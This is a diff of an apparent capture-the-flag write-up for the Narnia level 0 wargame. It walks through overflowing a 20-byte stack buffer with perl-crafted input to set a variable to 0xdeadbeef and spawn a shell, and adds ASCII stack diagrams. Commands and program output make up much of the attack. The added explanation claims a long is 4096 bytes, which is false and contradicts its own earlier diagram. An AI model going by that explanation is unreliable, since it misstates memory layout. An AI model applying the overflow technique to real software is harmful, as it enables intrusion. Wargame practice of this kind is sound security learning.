@@ -47,14 +47,37 @@ Well that's interesting that it did something weird with %p. Now let's check the
   	return 0;
   }
   
+From inspecting the code we can see that the stack looks something like this:
+        ||-------------------------||
+        ||                         ||
+        ||                         ||
+        || char buff ( 20 bytes )  ||
+        ||                         ||
+        ||                         ||
+        ||-------------------------||
+        ||   long val ( 4 bytes )  ||
+        ||-------------------------||
+  
 Alright now that I know this let's try some crafted input.
 -> perl -e 'print "A"x20 . "BBBB"' | ./narnia0
   Correct val's value from 0x41414141 -> 0xdeadbeef!
   Here is your chance: buf: AAAAAAAAAAAAAAAAAAAABBBB
   val: 0x42424242
   WAY OFF!!!!
+  
+Well that's great, we've just confirmed that we can affect what goes into long val.
+It's confirmed that i can overwrite the buffer.
+        ||-------------------------||
+        ||                         ||
+        ||                         ||
+        || char buff ( 20 bytes )  ||
+        ||                         ||
+        ||                         ||
+        ||-------------------------||
+        ||   long val ( 4 bytes )  ||
+        ||-------------------------||
 
-Well that's great, we've just confirmed that we can affect what goes into long val. Now let's try it with deadbeef in there.
+ Now let's try it with deadbeef in there.
 -> perl -e 'print "A"x20 . "deadbeef"' | ./narnia0
   Correct val's value from 0x41414141 -> 0xdeadbeef!
   Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAdead
@@ -83,6 +106,20 @@ Still no solution. Now I want to create a situation where the program does somet
   val: 0xdeadbeef
   /bin/sh: 1: ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?
   ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?ﾭ?cat: File name too long
+  
+        ||-------------------------||
+        ||                         ||
+        ||                         ||
+        || char buff ( 20 bytes )  ||
+        ||                         ||
+        ||                         ||         So I discovered I had the stack improperly setup
+        ||-------------------------||         because a long is actually 4096 bytes in size.
+        ||                         ||         This was demonstrated by the fact /bin/sh received
+                  .......                     the input that overflowed from the crafted string
+        || long val ( 4096 bytes ) ||         that I sent.
+                  .......
+        ||                         ||
+        ||-------------------------||
 
 Well that was useful, now lets whittle it down so that the /bin/sh command takes the correct input.
 All I should have to do now is remove the extra bytes.
